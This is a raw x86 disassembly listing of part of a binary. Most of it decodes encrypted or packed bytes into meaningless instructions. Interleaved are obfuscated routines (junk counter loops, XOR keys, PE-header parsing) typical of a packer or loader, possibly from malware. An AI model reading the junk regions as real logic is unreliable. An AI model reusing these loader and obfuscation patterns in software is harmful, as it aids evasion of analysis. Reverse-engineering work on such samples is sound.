  410101:	xchg   DWORD PTR [edx+0x21601815],eax
  410107:	xor    eax,0x314929d1
  41010c:	aas    
  41010d:	ret    
  41010e:	and    edi,ecx
  410110:	out    dx,eax
  410111:	pop    ebx
  410112:	sbb    eax,0x96e493fa
  410117:	sub    al,0xc8
  410119:	mov    ch,cl
  41011b:	cwde   
  41011c:	aaa    
  41011d:	pop    edi
  41011e:	mov    eax,DWORD PTR [ebp-0x4]
  410121:	xor    eax,edi
  410123:	pop    edi
  410124:	jmp    0x4104b7
  410129:	push   ecx
  41012a:	clc    
  41012b:	clc    
  41012c:	mov    ebx,0x9c5dbb51
  410131:	test   BYTE PTR [edi-0x56],dh
  410134:	adc    eax,ebx
  410136:	hlt    
  410137:	js     0x410146
  410139:	js     0x41017f
  41013b:	jle    0x4101bb
  41013d:	hlt    
  41013e:	jns    0x4101be
  410140:	jle    0x41015d
  410142:	dec    ebx
  410143:	mov    cs,edx
  410145:	pop    esp
  410146:	push   ebp
  410147:	icebp  
  410148:	fistp  QWORD PTR [edx+0x7c830622]
  41014e:	das    
  41014f:	aam    0xe
  410151:	scas   eax,DWORD PTR es:[edi]
  410152:	repnz (bad) [edx]
  410155:	mov    edi,0x684c1369
  41015a:	sbb    DWORD PTR [ebp+0x63cd80cf],ebx
  410160:	popa   
  410161:	jge    0x4101d1
  410163:	test   eax,0x50a47bf4
  410168:	es mov bh,0xcc
  41016b:	adc    DWORD PTR [edi-0x50],edx
  41016e:	add    edi,DWORD PTR [ebx+ebp*1-0x10]
  410172:	push   cs
  410173:	loope  0x41011c
  410175:	add    eax,DWORD PTR [ebx]
  410177:	xor    BYTE PTR [ebp-0x32f50b6a],dh
  41017d:	sar    esi,1
  41017f:	jmp    0xcdcfbb85
  410184:	jnp    0x4101e4
  410186:	arpl   WORD PTR [edi+0x7],cx
  410189:	adc    BYTE PTR [ecx-0x44d30ccb],0xa3
  410190:	mov    dl,0x6
  410192:	adc    BYTE PTR [ebx+0x64],ch
  410195:	inc    ecx
  410196:	xor    bl,0x69
  410199:	dec    edi
  41019a:	int    0x6f
  41019c:	and    al,0xf5
  41019e:	pop    esp
  41019f:	(bad)  
  4101a0:	adc    DWORD PTR [eax-0x4b],esi
  4101a3:	sti    
  4101a4:	mov    ds:0x135629d6,al
  4101a9:	xchg   ebp,eax
  4101aa:	test   BYTE PTR [ebx],bl
  4101ac:	lahf   
  4101ad:	clc    
  4101ae:	add    ebx,DWORD PTR [ebp+0x8e055d4]
  4101b4:	xor    al,0x38
  4101b6:	enter  0x1448,0x3b
  4101ba:	shl    DWORD PTR [ebx],cl
  4101bc:	sbb    edx,DWORD PTR [ebp-0x59]
  4101bf:	mov    dh,BYTE PTR [ebx-0x246c81c6]
  4101c5:	inc    eax
  4101c6:	vmread ebx,esi
  4101c9:	and    ebp,ecx
  4101cb:	xchg   BYTE PTR [ecx+0x29894741],dl
  4101d1:	in     al,0xf
  4101d3:	ins    DWORD PTR es:[edi],dx
  4101d4:	cmp    eax,0x60c6cdcb
  4101d9:	mov    bh,0xca
  4101db:	cwde   
  4101dc:	xchg   esp,eax
  4101dd:	mov    WORD PTR [ecx+eax*4-0x32],?
  4101e1:	das    
  4101e2:	out    dx,al
  4101e3:	(bad)  
  4101e4:	icebp  
  4101e5:	or     BYTE PTR [ebx-0x58e570d3],0x0
  4101ec:	(bad)  
  4101ed:	je     0x410267
  4101ef:	popa   
  4101f0:	clc    
  4101f1:	daa    
  4101f2:	pop    ecx
  4101f3:	push   ecx
  4101f4:	test   DWORD PTR [eax-0x629ca66c],esp
  4101fa:	ja     0x410247
  4101fc:	inc    esi
  4101fd:	and    eax,0xc973f0e0
  410202:	shl    DWORD PTR [bx+0x607a],cl
  410207:	and    al,0xcb
  410209:	mov    esp,0x8bccb513
  41020e:	push   0x36185836
  410213:	dec    edx
  410214:	fisub  WORD PTR [ebp-0x1493c453]
  41021a:	dec    edx
  41021b:	or     edi,ebp
  41021d:	test   eax,0x55e6cfa8
  410222:	lahf   
  410223:	mov    ebx,0x531e7d10
  410228:	xor    eax,0x9443326d
  41022d:	sahf   
  41022e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41022f:	pop    ebx
  410230:	in     eax,0xaf
  410232:	push   edi
  410233:	nop
  410234:	pop    es
  410235:	out    0x1a,eax
  410237:	sub    DWORD PTR [edi],0x6fb062a
  41023d:	cli    
  41023e:	inc    ebp
  41023f:	fld    QWORD PTR [edx+0x3c]
  410242:	or     ch,BYTE PTR [ebp-0xf]
  410245:	or     esp,ebx
  410247:	mov    ebx,esi
  410249:	jle    0x4101f1
  41024b:	loopne 0x4102b6
  41024d:	and    eax,0x11653b5d
  410252:	stos   DWORD PTR es:[edi],eax
  410253:	mov    cl,0x94
  410255:	outs   dx,DWORD PTR ds:[esi]
  410256:	jne    0x410280
  410258:	xor    ch,cl
  41025a:	loope  0x410297
  41025c:	adc    dh,BYTE PTR [ebx+0x6a]
  41025f:	adc    BYTE PTR [edi+edi*8],dh
  410262:	fcom   QWORD PTR [esi-0x517d4364]
  410268:	inc    edx
  410269:	jge    0x410208
  41026b:	inc    ebp
  41026c:	jae    0x41023f
  41026e:	mov    ebx,0xacca23db
  410273:	push   es
  410274:	scas   eax,DWORD PTR es:[edi]
  410275:	jae    0x4102d9
  410277:	popf   
  410278:	add    ebp,edi
  41027a:	lock xchg ebp,eax
  41027c:	mov    esp,0x3d082ec4
  410281:	imul   eax,DWORD PTR ds:0x91bb004d,0xdb2f121
  41028b:	in     eax,dx
  41028c:	mov    WORD PTR [eax+0xb61e489],fs
  410292:	lock push 0xd365833e
  410298:	or     cl,ch
  41029a:	sub    eax,0xfd1acc72
  41029f:	or     ebp,DWORD PTR [esi-0x31f27705]
  4102a5:	xlat   BYTE PTR ds:[ebx]
  4102a6:	cs dec esp
  4102a8:	fstp   QWORD PTR [eax]
  4102aa:	jbe    0x4102a2
  4102ac:	in     al,dx
  4102ad:	in     al,dx
  4102ae:	hlt    
  4102af:	jns    0x41023c
  4102b1:	jo     0x410317
  4102b3:	out    dx,al
  4102b4:	push   esp
  4102b5:	jbe    0x410301
  4102b7:	adc    esi,esi
  4102b9:	sbb    eax,0x344d19bb
  4102be:	add    DWORD PTR [ecx+esi*8],ebx
  4102c1:	jo     0x410330
  4102c3:	ret    
  4102c4:	jmp    0x85c354f
  4102c9:	jp     0x41025d
  4102cb:	sahf   
  4102cc:	jbe    0x4102b8
  4102ce:	xchg   edx,ebp
  4102d0:	mov    dl,0xd0
  4102d2:	jl     0x410340
  4102d4:	jo     0x410354
  4102d6:	retf   0xe401
  4102d9:	add    al,0x6d
  4102db:	loope  0x4102b5
  4102dd:	mov    edx,0xa4fb736d
  4102e2:	into   
  4102e3:	and    ebx,edi
  4102e5:	(bad)  
  4102e6:	sub    DWORD PTR [ecx],esp
  4102e8:	xchg   ebx,eax
  4102e9:	call   0xaed0:0xb216d7ba
  4102f0:	pop    ebp
  4102f1:	mov    ds:0x4813e746,eax
  4102f6:	popa   
  4102f7:	jns    0x410293
  4102f9:	(bad)  
  4102fb:	mov    al,ds:0x128c5e0f
  410300:	scas   eax,DWORD PTR es:[edi]
  410301:	daa    
  410302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410303:	sbb    eax,0x541aa3e3
  410308:	push   edx
  410309:	and    eax,0x29ed1c3c
  41030e:	mov    edi,ecx
  410310:	sbb    eax,0x5af6936a
  410315:	shr    DWORD PTR [edx],0x4e
  410318:	mov    eax,ds:0x572d5549
  41031d:	adc    BYTE PTR [ebp+eiz*4+0x79c7db03],bl
  410324:	shr    DWORD PTR [edx+0x6a2f8b94],0xaa
  41032b:	popf   
  41032c:	stos   BYTE PTR es:[edi],al
  41032d:	xchg   esp,eax
  41032e:	add    eax,0x145ef9b6
  410333:	outs   dx,BYTE PTR ds:[esi]
  410334:	(bad)  
  410335:	rcr    BYTE PTR [edx-0x2a],1
  410338:	mov    ds:0x1bea63c0,al
  41033d:	push   edx
  41033e:	(bad)  
  41033f:	ja     0x4102c9
  410341:	ficomp DWORD PTR [eax]
  410343:	add    bh,dl
  410345:	push   eax
  410346:	es cwde 
  410348:	sbb    esi,0xcc31931d
  41034e:	mov    bh,0x6a
  410350:	mov    cl,0xa4
  410352:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410353:	add    DWORD PTR [eax+edi*4],ebx
  410356:	adc    cl,dl
  410358:	out    dx,eax
  410359:	mov    BYTE PTR ss:[eax-0x54],ah
  41035d:	pop    ebx
  41035e:	mov    bl,0x0
  410360:	ins    DWORD PTR es:[edi],dx
  410361:	imul   edi,ecx,0x512c9cec
  410367:	xor    DWORD PTR [edx+0x699739f5],0xffffffb2
  41036e:	cmp    edi,esi
  410370:	push   ecx
  410371:	pusha  
  410372:	icebp  
  410373:	es xchg ebx,eax
  410375:	loop   0x410398
  410377:	push   0x3d
  410379:	inc    ecx
  41037a:	jns    0x4103da
  41037c:	cwde   
  41037d:	pop    ebp
  41037e:	nop
  41037f:	idiv   BYTE PTR [ebp+0xc]
  410382:	push   esi
  410383:	shr    DWORD PTR [ebx-0x7c],1
  410386:	pop    esp
  410387:	jecxz  0x410363
  410389:	imul   edi,edi,0x15752021
  41038f:	mov    esp,eax
  410391:	cdq    
  410392:	or     edx,DWORD PTR [eax+ebp*1-0x1a]
  410396:	xchg   esp,eax
  410397:	rcl    BYTE PTR es:[eax+0x31],1
  41039b:	inc    esp
  41039c:	mov    BYTE PTR [edx+0x79],dl
  41039f:	out    0x1e,eax
  4103a1:	rcl    al,0x88
  4103a4:	popa   
  4103a5:	xor    ch,BYTE PTR [esi-0x5570ead1]
  4103ab:	(bad)  
  4103ac:	push   DWORD PTR [edx-0x194c1cff]
  4103b2:	push   esp
  4103b3:	sub    edx,DWORD PTR [edx]
  4103b5:	scas   al,BYTE PTR es:[edi]
  4103b6:	into   
  4103b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103b8:	rcl    BYTE PTR [ecx],cl
  4103ba:	js     0x4103a3
  4103bc:	pop    ecx
  4103bd:	add    al,BYTE PTR [ecx+0x3]
  4103c0:	pop    ss
  4103c1:	popf   
  4103c2:	lea    esi,ds:0xa4cf0907
  4103c8:	xchg   edi,eax
  4103c9:	push   esp
  4103ca:	std    
  4103cb:	in     al,0x6e
  4103cd:	les    ebx,FWORD PTR [esi+ebx*8-0x2fb5fdb4]
  4103d4:	xor    DWORD PTR [esi-0x7d3b2fa7],eax
  4103da:	pop    ss
  4103db:	mov    al,ds:0x37d63477
  4103e0:	push   edi
  4103e1:	push   cs
  4103e2:	fdiv   QWORD PTR [esi]
  4103e4:	push   ecx
  4103e5:	mov    dl,0xef
  4103e7:	xchg   DWORD PTR [eax+0x7e642767],eax
  4103ed:	sub    edx,ebp
  4103ef:	mov    al,0xe9
  4103f1:	fsub   DWORD PTR [edx-0x3994ffd1]
  4103f7:	xchg   ecx,eax
  4103f8:	cwde   
  4103f9:	or     BYTE PTR [edi-0x74653945],cl
  4103ff:	aam    0x51
  410401:	sbb    al,0x84
  410403:	not    BYTE PTR [ebx-0x422d7e95]
  410409:	pop    ebx
  41040a:	loopne 0x410466
  41040c:	cmp    BYTE PTR [ebp+ecx*8+0x55def511],bl
  410413:	dec    eax
  410414:	loope  0x410468
  410416:	adc    ah,dh
  410418:	push   edi
  410419:	push   ecx
  41041a:	(bad)
  41041d:	ja     0x41041c
  41041f:	les    esp,FWORD PTR [edi-0x2eb6c139]
  410425:	push   eax
  410426:	rep ins BYTE PTR es:[edi],dx
  410428:	xchg   edx,eax
  410429:	mov    BYTE PTR [esi],bh
  41042b:	lahf   
  41042c:	out    dx,al
  41042d:	ss dec esi
  41042f:	cmp    al,0x9a
  410431:	xlat   BYTE PTR ds:[ebx]
  410432:	ret    0xb126
  410435:	popf   
  410436:	retf   0xf354
  410439:	xchg   BYTE PTR [ecx+0x1c66d4eb],ah
  41043f:	inc    edx
  410440:	in     eax,dx
  410441:	xor    ebx,edi
  410443:	push   edx
  410444:	data16 jmp 0x4104bd
  410447:	cmp    ah,BYTE PTR [ebx-0x7e]
  41044a:	xor    al,0x18
  41044d:	mov    ecx,0x2966f468
  410452:	jp     0x410448
  410454:	push   eax
  410455:	pop    ecx
  410456:	popf   
  410457:	shl    BYTE PTR [ebx],0xdd
  41045a:	int3   
  41045b:	inc    ebx
  41045c:	add    BYTE PTR [esi],0x71
  41045f:	bound  ecx,QWORD PTR [ecx+eiz*4+0x10194464]
  410466:	jb     0x410452
  410468:	adc    al,0xca
  41046a:	push   ebx
  41046b:	retf   
  41046c:	add    eax,0x1348beeb
  410471:	and    esp,edx
  410473:	jb     0x41043e
  410475:	xchg   esp,eax
  410476:	and    eax,DWORD PTR [ebx-0x7e]
  410479:	add    esi,DWORD PTR [esi+0x78]
  41047c:	add    eax,0xf0568bd9
  410481:	mov    dh,0x9a
  410483:	cmc    
  410484:	(bad)  
  410485:	iret   
  410486:	into   
  410487:	dec    edx
  410488:	sub    cl,BYTE PTR [edx]
  41048a:	adc    eax,0x5c297e2c
  41048f:	mov    edi,0xabee82f0
  410494:	scas   eax,DWORD PTR es:[edi]
  410495:	out    dx,eax
  410496:	jae    0x410446
  410498:	mov    cl,0xe5
  41049a:	mov    cs,eax
  41049c:	add    ebx,ecx
  41049e:	mov    ds:0xc91f65cb,al
  4104a3:	dec    ecx
  4104a4:	imul   edi,DWORD PTR [ebp+0x5931f1aa],0x139b7c7d
  4104ae:	xor    esi,esp
  4104b0:	imul   esp,DWORD PTR [ebx],0x82bb7008
  4104b6:	dec    esp
  4104b7:	add    eax,esi
  4104b9:	pop    esi
  4104ba:	leave  
  4104bb:	ret    0xc
  4104be:	push   ebp
  4104bf:	mov    ebp,esp
  4104c1:	push   ecx
  4104c2:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  4104c9:	mov    DWORD PTR ds:0x4345f7,0x1f
  4104d3:	cmp    DWORD PTR ds:0x4345f7,0x0
  4104da:	je     0x410527
  4104e0:	cmp    DWORD PTR ds:0x4345f7,0x10
  4104e7:	jne    0x4104f6
  4104ed:	push   DWORD PTR [ebp-0x28]
  4104f0:	call   DWORD PTR ds:0x41335c
  4104f6:	cmp    DWORD PTR ds:0x4345f7,0x11
  4104fd:	jne    0x41050e
  410503:	mov    eax,ds:0x4345f7
  410508:	dec    eax
  410509:	mov    ds:0x4345f7,eax
  41050e:	xor    eax,eax
  410510:	add    eax,DWORD PTR ds:0x4345f7
  410516:	dec    eax
  410517:	mov    ds:0x4345f7,eax
  41051c:	jmp    0x4104d3
  410521:	xor    DWORD PTR ds:0x434647,ebx
  410527:	mov    eax,DWORD PTR [ebp+0x8]
  41052a:	and    DWORD PTR ds:0x43468f,0x434713
  410534:	mov    al,BYTE PTR [eax]
  410536:	add    al,0x3a
  410538:	xor    al,0x44
  41053a:	cmp    al,0xc3
  41053c:	mov    DWORD PTR ds:0x43464f,0x7f5c
  410546:	jne    0x410979
  41054c:	and    edx,DWORD PTR ds:0x434687
  410552:	mov    eax,DWORD PTR [ebp+0x8]
  410555:	and    DWORD PTR ds:0x4345eb,0x0
  41055f:	jmp    0x410571
  410564:	mov    edx,DWORD PTR ds:0x4345eb
  41056a:	inc    edx
  41056b:	mov    DWORD PTR ds:0x4345eb,edx
  410571:	cmp    DWORD PTR ds:0x4345eb,0x1c
  410578:	jae    0x4105c7
  41057e:	cmp    DWORD PTR ds:0x4345eb,0xc
  410585:	jne    0x4105a6
  41058b:	push   0x1ce2
  410590:	push   DWORD PTR [ebp-0x24]
  410593:	push   0x6804
  410598:	push   DWORD PTR [ebp-0x18]
  41059b:	push   0x869f
  4105a0:	call   DWORD PTR ds:0x4130d4
  4105a6:	cmp    DWORD PTR ds:0x4345eb,0xb
  4105ad:	jne    0x4105c2
  4105b3:	xor    edx,edx
  4105b5:	or     edx,DWORD PTR ds:0x4345eb
  4105bb:	inc    edx
  4105bc:	mov    DWORD PTR ds:0x4345eb,edx
  4105c2:	jmp    0x410564
  4105c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4105ca:	add    ecx,DWORD PTR [eax+0x3c]
  4105cd:	mov    edx,0x7510851
  4105d2:	mov    DWORD PTR [ebp+0x8],ecx
  4105d5:	mov    eax,DWORD PTR [ebp-0x4]
  4105d8:	xor    eax,edx
  4105da:	push   esi
  4105db:	jmp    0x410796
  4105e0:	mov    ebp,0x6da24588
  4105e5:	jae    0x410664
  4105e7:	mov    DWORD PTR [eax],ecx
  4105e9:	sub    esi,DWORD PTR [esi+ecx*2]
  4105ec:	jnp    0x4105c1
  4105ee:	ins    BYTE PTR es:[edi],dx
  4105ef:	aam    0xf6
  4105f1:	inc    edi
  4105f2:	jle    0x410672
  4105f4:	pushf  
  4105f5:	jg     0x410675
  4105f7:	jle    0x4105fa
  4105f9:	cs dec edx
  4105fb:	pop    eax
  4105fc:	int3   
  4105fd:	les    eax,FWORD PTR [ecx]
  4105ff:	cmp    DWORD PTR [ebx-0x59e8302c],edx
  410605:	mov    esp,0xf16f9fe5
  41060a:	lahf   
  41060b:	add    BYTE PTR [ebx],cl
  41060d:	imul   edx,DWORD PTR [ecx+ebp*8-0x3b],0xf858724d
  410615:	pop    esp
  410616:	icebp  
  410617:	jbe    0x4105c8
  410619:	in     eax,dx
  41061a:	or     eax,0x94c99ab6
  41061f:	les    esp,FWORD PTR [eax-0x43]
  410622:	sbb    BYTE PTR [edi],bh
  410624:	inc    esi
  410625:	(bad)  
  410626:	cmp    ecx,0xffffffb5
  410629:	dec    edx
  41062a:	retf   0x5290
  41062d:	fild   DWORD PTR [eax+0x1b]
  410630:	dec    ebx
  410631:	push   di
  410633:	test   al,0xb9
  410635:	cmp    edx,DWORD PTR [eax-0x49]
  410638:	and    esi,DWORD PTR [esi+0x31]
  41063b:	mov    ch,0xa5
  41063d:	add    DWORD PTR ss:[ecx-0x7a4341bc],ebp
  410644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410645:	rol    esp,cl
  410647:	hlt    
  410648:	pop    ecx
  410649:	or     al,0xea
  41064b:	dec    edx
  41064c:	pop    ecx
  41064d:	jp     0x41063d
  41064f:	cld    
  410650:	and    al,0xd
  410652:	pusha  
  410653:	add    esp,DWORD PTR [ebp-0xa4befe5]
  410659:	or     eax,0x157a8e7c
  41065e:	sbb    bl,BYTE PTR [esi]
  410660:	mov    ch,0x2b
  410662:	jbe    0x41068d
  410664:	nop
  410665:	or     DWORD PTR [edx+0x7f],eax
  410668:	(bad)  
  410669:	gs inc edx
  41066b:	call   0xe75b:0x52f2f3aa
  410672:	xchg   edi,eax
  410673:	iret   
  410674:	inc    ebx
  410675:	lds    esi,FWORD PTR [edx+ebp*1+0x56]
  410679:	sbb    dh,dh
  41067b:	ja     0x4106f7
  41067d:	push   DWORD PTR [eax-0x58f26a9]
  410683:	mov    edi,0xc9e20306
  410688:	adc    al,0xe8
  41068a:	push   eax
  41068b:	pop    ss
  41068c:	pop    edi
  41068d:	cmp    edi,DWORD PTR ds:0xf9f32386
  410693:	retf   
  410694:	xor    dl,BYTE PTR [ecx+edx*4+0x2b]
  410698:	lea    esi,[esi]
  41069a:	xchg   ebx,eax
  41069b:	mov    edi,0x9ade4a2e
  4106a0:	int    0x5f
  4106a2:	push   ecx
  4106a3:	hlt    
  4106a4:	or     edi,esi
  4106a6:	adc    DWORD PTR [esi],ecx
  4106a8:	xchg   ebp,eax
  4106a9:	inc    esi
  4106aa:	adc    dh,0x16
  4106ad:	mov    esp,0x21218445
  4106b2:	or     eax,0x14b860fd
  4106b7:	call   0xda80e2e5
  4106bc:	dec    ebp
  4106bd:	fisub  DWORD PTR ds:[ecx-0x4c]
  4106c1:	icebp  
  4106c2:	test   DWORD PTR [eax-0xb],esp
  4106c5:	hlt    
  4106c6:	push   eax
  4106c7:	or     DWORD PTR [eax],edi
  4106c9:	pop    esp
  4106ca:	sbb    al,0x89
  4106cc:	out    dx,eax
  4106cd:	or     DWORD PTR [edi-0x1917dc3d],edi
  4106d3:	(bad)  
  4106d4:	mov    fs,WORD PTR [ebx-0x714d3665]
  4106da:	(bad)  
  4106dc:	test   eax,0x9d41086a
  4106e1:	adc    BYTE PTR [edi+0x5012bda1],cl
  4106e7:	cmc    
  4106e8:	pop    ebp
  4106e9:	adc    DWORD PTR [esi],ebp
  4106eb:	push   eax
  4106ec:	scas   eax,DWORD PTR es:[edi]
  4106ed:	adc    ecx,ebx
  4106ef:	pop    ss
  4106f0:	sbb    BYTE PTR [esi+ebp*2],dl
  4106f3:	or     ebx,DWORD PTR [edx+0x67eab802]
  4106f9:	pop    ecx
  4106fa:	fdivr  st(6),st
  4106fc:	pop    ecx
  4106fd:	and    BYTE PTR [edi+0x58ab6aac],cl
  410703:	inc    edx
  410704:	aaa    
  410705:	cmp    DWORD PTR [eax],esp
  410707:	adc    ebp,DWORD PTR [ebx]
  410709:	add    bl,BYTE PTR [ebp+0x50]
  41070c:	jp     0x41071c
  41070e:	ret    
  41070f:	xchg   esp,eax
  410710:	sub    esi,DWORD PTR [ebx]
  410712:	dec    edi
  410713:	adc    BYTE PTR [ecx+0xe],ah
  410716:	rcr    DWORD PTR [ebp+0x56],1
  410719:	adc    al,0xcc
  41071b:	loopne 0x4106c1
  41071d:	cmp    al,ah
  41071f:	cld    
  410720:	addr16 hlt 
  410722:	xlat   BYTE PTR ds:[ebx]
  410723:	cmp    ebx,DWORD PTR [eax]
  410725:	lds    esi,FWORD PTR [ebx+0x2b5d8491]
  41072b:	lods   al,BYTE PTR ds:[esi]
  41072c:	or     eax,0xd3dab9ee
  410731:	xor    BYTE PTR [ecx-0x5b],dl
  410734:	fwait
  410735:	test   eax,0x1988164b
  41073a:	jnp    0x4106bd
  41073c:	sbb    eax,0x26a9503a
  410741:	ret    
  410742:	int    0x79
  410744:	mov    ebx,0x9d034f4c
  410749:	and    DWORD PTR [esi],0xd140833e
  41074f:	jbe    0x4107d0
  410751:	push   esi
  410752:	mov    eax,ds:0xdfc44dac
  410757:	jge    0x4107a0
  410759:	xor    edi,DWORD PTR [eax+ebx*2-0x68ed7d3a]
  410760:	dec    eax
  410761:	adc    eax,DWORD PTR [edi]
  410763:	pop    es
  410764:	cmp    al,0x4c
  410766:	sbb    ebx,DWORD PTR ss:0x8c52b647
  41076d:	xchg   BYTE PTR [edx+eiz*2],ah
  410770:	dec    esp
  410771:	mov    al,0x75
  410773:	out    dx,al
  410774:	lock fst DWORD PTR [ebp+0x59]
  410778:	in     eax,dx
  410779:	call   0x6b33c2a0
  41077e:	mov    edx,DWORD PTR [ebx+0x478cc8ae]
  410784:	repnz or cl,BYTE PTR [ecx+esi*1]
  410788:	push   ss
  410789:	or     ecx,0xe4be926f
  41078f:	dec    ebx
  410790:	imul   BYTE PTR [eax+0x4c]
  410793:	stos   DWORD PTR es:[edi],eax
  410794:	lods   al,BYTE PTR ds:[esi]
  410795:	jge    0x410722
  410797:	jne    0x4107a1
  410799:	mov    ecx,0x327299
  41079e:	jmp    0x410959
  4107a3:	cmc    
  4107a4:	mov    al,BYTE PTR [esi+ecx*8+0x65]
  4107a8:	enter  0xb575,0x7e
  4107ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ad:	mov    dl,0x1f
  4107af:	cmp    al,0xad
  4107b1:	in     al,dx
  4107b2:	and    eax,0x7e7e4114
  4107b7:	pushf  
  4107b8:	jg     0x410838
  4107ba:	jle    0x4107d5
  4107bc:	xor    bh,BYTE PTR [edx-0x1f]
  4107bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107c0:	sub    dl,dh
  4107c2:	rcl    DWORD PTR [esi+0x42],cl
  4107c5:	xor    BYTE PTR [ebp-0x7d],0x62
  4107c9:	push   ds
  4107ca:	imul   ebx,DWORD PTR [ecx-0x4e163c2d],0x19
  4107d1:	mov    dl,0xfb
  4107d3:	jg     0x410819
  4107d5:	jg     0x4107e4
  4107d7:	xchg   esi,eax
  4107d8:	sahf   
  4107d9:	out    0x57,al
  4107db:	and    bh,BYTE PTR [ecx-0x33]
  4107de:	fsubr  QWORD PTR [edx-0xb]
  4107e1:	sbb    BYTE PTR [eax-0x152721ef],0xd0
  4107e8:	(bad)  
  4107e9:	fmul   DWORD PTR [ebp+0x7af4dfcb]
  4107ef:	xchg   edx,eax
  4107f0:	xchg   esp,eax
  4107f1:	ret    
  4107f2:	and    bl,BYTE PTR [edi]
  4107f4:	pop    eax
  4107f5:	xchg   edi,eax
  4107f6:	sbb    al,0x64
  4107f8:	fucomp st(5)
  4107fa:	pop    ecx
  4107fb:	ror    DWORD PTR [ecx+0x55bb5c46],0xaa
  410802:	lods   eax,DWORD PTR ds:[esi]
  410803:	inc    ebp
  410804:	push   esi
  410805:	xchg   DWORD PTR [edi+0x2b],ebp
  410808:	imul   ecx,DWORD PTR [ebx+edx*2-0x15],0xe19a3858
  410810:	call   0x8ccdec24
  410815:	leave  
  410816:	cs push edx
  410818:	or     DWORD PTR [edx-0x2f],esi
  41081b:	fstp   DWORD PTR [ecx+0x1f]
  41081e:	push   edx
  41081f:	ret    0x6fb0
  410822:	or     eax,0x1e4e7b5d
  410827:	mov    eax,ebx
  410829:	sub    edi,edx
  41082b:	arpl   WORD PTR [ebp-0x71],ax
  41082e:	adc    eax,0x23916213
  410833:	jle    0x410803
  410835:	add    eax,DWORD PTR [eax+0x42]
  410838:	cmc    
  410839:	mov    al,ds:0x3b28d5f
  41083e:	jmp    0x410800
  410840:	and    BYTE PTR [edx],bh
  410842:	imul   ebx,ecx,0xd27a21a
  410848:	inc    esp
  410849:	loop   0x4107d9
  41084b:	imul   ebp,DWORD PTR [ebx-0x18],0x2261a931
  410852:	xchg   ebx,eax
  410853:	push   0xe300e9a0
  410858:	pop    ss
  410859:	lahf   
  41085a:	mov    al,ds:0x5d1a4a2d
  41085f:	xchg   edi,eax
  410860:	scas   al,BYTE PTR es:[edi]
  410861:	xchg   ebx,eax
  410862:	bound  ebp,QWORD PTR [eax+edi*4+0x1d]
  410866:	add    edx,DWORD PTR cs:[ecx]
  410869:	es and ch,0xbb
  41086d:	scas   eax,DWORD PTR es:[edi]
  41086e:	mov    esi,0x2d268f07
  410873:	mov    ds,WORD PTR [edx]
  410875:	arpl   WORD PTR [edi-0x5e3f8d5f],cx
  41087b:	sub    al,0xdb
  41087d:	adc    eax,0x2851ca43
  410882:	pop    edi
  410883:	mov    ebx,0x43f7b50f
  410888:	out    dx,eax
  410889:	sbb    al,0x85
  41088b:	fisubr DWORD PTR [edx+ebp*8+0x34]
  41088f:	mov    ds:0xab3c1bed,al
  410894:	cs mov ecx,0x7a0cd30e
  41089a:	jle    0x4108e9
  41089c:	jb     0x4108a4
  41089e:	dec    edi
  41089f:	mov    cl,0x80
  4108a1:	or     DWORD PTR [esi],esi
  4108a3:	push   ds
  4108a4:	cmp    BYTE PTR [edi+edx*4+0x55526fc9],bl
  4108ab:	add    BYTE PTR [eax+ebx*1],cl
  4108ae:	xor    dh,bl
  4108b0:	addr16 test ah,0x2b
  4108b4:	jbe    0x4108ad
  4108b6:	and    BYTE PTR [ebp-0x2b],ch
  4108b9:	mov    ch,BYTE PTR [ebx]
  4108bb:	pop    ebx
  4108bc:	aaa    
  4108bd:	mov    eax,ds:0xcbe99f44
  4108c2:	sub    eax,DWORD PTR [eax-0xc]
  4108c5:	inc    edi
  4108c6:	call   0xa8f14c5d
  4108cb:	stc    
  4108cc:	rcl    BYTE PTR [edi+ebp*8+0x77],0x48
  4108d1:	nop
  4108d2:	clc    
  4108d3:	inc    esp
  4108d4:	ds sub eax,0x55a77567
  4108da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108db:	sbb    ebp,DWORD PTR [edi+ebp*2+0x1f]
  4108df:	and    BYTE PTR [esi+0x64f72f05],dh
  4108e5:	sbb    DWORD PTR [eax+0x199cf62],edi
  4108eb:	jmp    0xd559:0xc0645d80
  4108f2:	cli    
  4108f3:	fidivr WORD PTR [eax-0x33]
  4108f6:	leave  
  4108f7:	mov    ebx,0x6354d573
  4108fc:	jmp    0xecd1ea2e
  410901:	or     eax,DWORD PTR [edi]
  410903:	push   ebp
  410904:	stos   BYTE PTR es:[edi],al
  410905:	push   esp
  410906:	out    dx,eax
  410907:	mov    esi,0x7c114fa7
  41090c:	push   0xc
  41090e:	popf   
  41090f:	out    dx,al
  410910:	xor    esp,DWORD PTR [esi+0x2b9ede63]
  410916:	sbb    edi,DWORD PTR ds:0x816cd2d1
  41091c:	inc    esp
  41091d:	cmp    ecx,0xffffffe5
  410920:	sti    
  410921:	test   eax,0x8ac7f5d6
  410926:	pop    esp
  410927:	xor    al,0xd3
  410929:	xchg   BYTE PTR [ecx-0x1ec229e],al
  41092f:	and    cl,BYTE PTR [ecx]
  410931:	out    dx,eax
  410932:	push   cs
  410933:	aas    
  410934:	pop    es
  410935:	lods   eax,DWORD PTR ds:[esi]
  410936:	mov    bl,0x86
  410938:	or     BYTE PTR [ebx-0x4de3eea8],ch
  41093e:	aas    
  41093f:	and    bl,cl
  410941:	imul   esp
  410943:	inc    eax
  410944:	and    ch,BYTE PTR [ecx]
  410946:	retf   
  410947:	outs   dx,DWORD PTR ds:[esi]
  410948:	jae    0x4108e5
  41094a:	xor    eax,DWORD PTR [edx-0x1555570]
  410950:	cmp    eax,0x99c19210
  410955:	sbb    eax,0x3d536ef
  41095a:	sar    DWORD PTR [ecx],0x46
  41095d:	push   esp
  41095e:	pop    esi
  41095f:	je     0x41096d
  410965:	mov    eax,DWORD PTR [ebp+0x8]
  410968:	jmp    0x410986
  41096d:	mov    eax,DWORD PTR [ebp-0x4]
  410970:	xor    eax,edx
  410972:	add    eax,ecx
  410974:	jmp    0x410986
